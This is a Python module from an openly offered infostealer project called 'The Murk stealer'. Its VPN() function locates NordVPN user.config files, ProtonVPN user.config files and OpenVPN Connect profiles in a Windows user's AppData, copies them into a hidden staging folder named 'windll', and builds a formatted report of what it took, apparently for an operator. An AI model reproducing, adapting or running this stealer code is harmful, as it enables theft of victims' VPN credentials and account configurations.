#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import environ, sep, listdir,mkdir
from os.path import exists
from glob import glob
from shutil import copy
from manager.logger import Log

def VPN():
    data= ""
    data += "\n\n\n<b>📡VPN📡</b>"
    Log("===========VPN===========")
    local = environ['USERPROFILE'] + sep + r'AppData\Local'
    appdata = environ['USERPROFILE'] + sep + r'AppData\Roaming'

    directory = {
        'Nord VPN': local + '\\NordVPN\\',
        'Open VPN': appdata + '\\OpenVPN Connect\\profiles\\',
        'Proton VPN': local + '\\ProtonVPN\\'
    }
    
    logs = {}
    for key, value in directory.items():
        try:
            if exists(value):
                if key == 'Nord VPN':
                    logs[key] = ''.join(glob(value+"\\NordVPN.exe*"))+'\\'+listdir(''.join(glob(value+"\\NordVPN.exe*")))[0] + '\\user.config'
                if key == 'Open VPN':
                    logs[key] = value+listdir(value)[0]
                if key == 'Proton VPN':
                    logs[key] = ''.join(glob(value+"\\ProtonVPN.exe*"))+'\\'+listdir(''.join(glob(value+"\\ProtonVPN.exe*")))[0] + '\\user.config'
        except Exception as e:
            Log(f"VPN({key}) ---> {e}")

    
    if logs:
            try:
                mkdir(rf'{local}\windll\VPN')
                for key, value in logs.items():
                    mkdir(rf'{local}\windll\VPN/'+key+'\\')
                    copy(value, rf'{local}\windll\VPN/'+key+'\\')
                    data += f"\n∟⛓{key}"
            except Exception as e:
                Log(f"VPN(write) ---> {e}")

    return data